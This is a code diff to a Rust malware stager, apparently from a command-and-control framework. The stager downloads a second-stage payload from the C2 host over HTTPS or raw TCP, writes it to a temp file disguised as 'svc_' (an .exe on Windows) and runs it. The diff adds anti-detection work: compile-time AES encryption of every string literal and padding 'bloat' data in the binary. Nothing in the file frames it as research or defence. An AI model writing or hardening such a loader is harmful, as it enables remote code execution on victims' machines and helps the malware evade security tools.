@@ -6,35 +6,42 @@
 // for initial access where payload size matters.
 //
 // The stager config (C2 host, port, etc.) is embedded at build time
-// via the same C2_BUILD_CONFIG mechanism as the full agent.
+// via the same C2_BUILD_CONFIG mechanism as the full agent. The embedded
+// blob is a packed binary C2Config (see common.rs); the stager unpacks it
+// and uses only the fields it needs.
 
 use std::fs;
 use std::process::Command;
-use std::io::Write;
+
+use rcm::strcrypt_rt;
 
 mod config {
-    use serde::Deserialize;
+    // aes_str! expands to a relative `strcrypt_rt::decrypt(...)` path, so the
+    // crate-root import above is not enough inside this inner module.
+    #[allow(unused_imports)]
+    use rcm::strcrypt_rt;
+    include!(concat!(env!("OUT_DIR"), "/obfuscated_config.rs"));
+    include!(concat!(env!("OUT_DIR"), "/bloat_data.rs"));
 
-    #[derive(Deserialize)]
+    /// Subset of the embedded C2Config the stager actually uses.
+    /// Not serde-backed: no field names in the binary.
     pub struct StagerConfig {
         pub c2_host: String,
         pub tunnel_port: u16,
         pub build_id: String,
-        #[serde(default = "default_stage_path")]
         pub stage_path: String,
     }
 
-    fn default_stage_path() -> String { "/stage".into() }
-
-    include!(concat!(env!("OUT_DIR"), "/obfuscated_config.rs"));
-    include!(concat!(env!("OUT_DIR"), "/bloat_data.rs"));
-
     pub fn load() -> StagerConfig {
         use_bloat();
-        let json = get_config();
-        match serde_json::from_str(&json) {
-            Ok(c) => c,
-            Err(_) => std::process::exit(1),
+        let bytes = get_config();
+        let cfg = rcm::common::C2Config::unpack(&bytes)
+            .unwrap_or_else(|| std::process::exit(1));
+        StagerConfig {
+            c2_host: cfg.c2_host,
+            tunnel_port: cfg.tunnel_port,
+            build_id: cfg.build_id,
+            stage_path: strcrypt::aes_str!("/stage"),
         }
     }
 }
@@ -44,17 +51,19 @@ fn main() {
     std::panic::set_hook(Box::new(|_| {}));
 
     let cfg = config::load();
-    let url = format!("https://{}:{}/stage/{}", cfg.c2_host, cfg.tunnel_port, cfg.build_id);
+    let url = format!("{}://{}:{}{}/{}",
+        strcrypt::aes_str!("https"), cfg.c2_host, cfg.tunnel_port,
+        cfg.stage_path, cfg.build_id);
 
     // Attempt download via native TLS
     match download_stage(&url) {
         Ok(payload) => {
             if let Err(e) = execute_payload(&payload) {
-                if cfg!(debug_assertions) { eprintln!("[-] Exec failed: {}", e); }
+                if cfg!(debug_assertions) { eprintln!("{} {}", strcrypt::aes_str!("[-] Exec failed:"), e); }
             }
         }
         Err(e) => {
-            if cfg!(debug_assertions) { eprintln!("[-] Download failed: {}", e); }
+            if cfg!(debug_assertions) { eprintln!("{} {}", strcrypt::aes_str!("[-] Download failed:"), e); }
             // Retry with manual HTTP
             let addr = format!("{}:{}", cfg.c2_host, cfg.tunnel_port);
             if let Ok(payload) = download_raw_tcp(&addr, &cfg.build_id) {
@@ -68,7 +77,7 @@ fn download_stage(url: &str) -> Result<Vec<u8>, String> {
     // Use reqwest if available, otherwise fall back to raw TCP
     let resp = reqwest::blocking::get(url).map_err(|e| e.to_string())?;
     if !resp.status().is_success() {
-        return Err(format!("HTTP {}", resp.status()));
+        return Err(format!("{} {}", strcrypt::aes_str!("HTTP"), resp.status()));
     }
     resp.bytes().map(|b| b.to_vec()).map_err(|e| e.to_string())
 }
@@ -78,10 +87,10 @@ fn download_raw_tcp(addr: &str, build_id: &str) -> Result<Vec<u8>, String> {
     use std::io::{Read, Write};
 
     let mut stream = TcpStream::connect(addr).map_err(|e| e.to_string())?;
-    let request = format!(
-        "GET /stage/{} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
-        build_id, addr
-    );
+    let request = format!("{}{}{}{}{}",
+        strcrypt::aes_str!("GET /stage/"), build_id,
+        strcrypt::aes_str!(" HTTP/1.1\r\nHost: "), addr,
+        strcrypt::aes_str!("\r\nConnection: close\r\n\r\n"));
     stream.write_all(request.as_bytes()).map_err(|e| e.to_string())?;
 
     let mut response = Vec::new();
@@ -97,8 +106,8 @@ fn download_raw_tcp(addr: &str, build_id: &str) -> Result<Vec<u8>, String> {
 
 fn execute_payload(payload: &[u8]) -> Result<(), String> {
     let temp_dir = std::env::temp_dir();
-    let ext = if cfg!(target_os = "windows") { ".exe" } else { "" };
-    let temp_path = temp_dir.join(format!("svc_{}{}", uuid_simple(), ext));
+    let ext = if cfg!(target_os = "windows") { strcrypt::aes_str!(".exe") } else { String::new() };
+    let temp_path = temp_dir.join(format!("{}{}{}", strcrypt::aes_str!("svc_"), uuid_simple(), ext));
 
     fs::write(&temp_path, payload).map_err(|e| e.to_string())?;
 
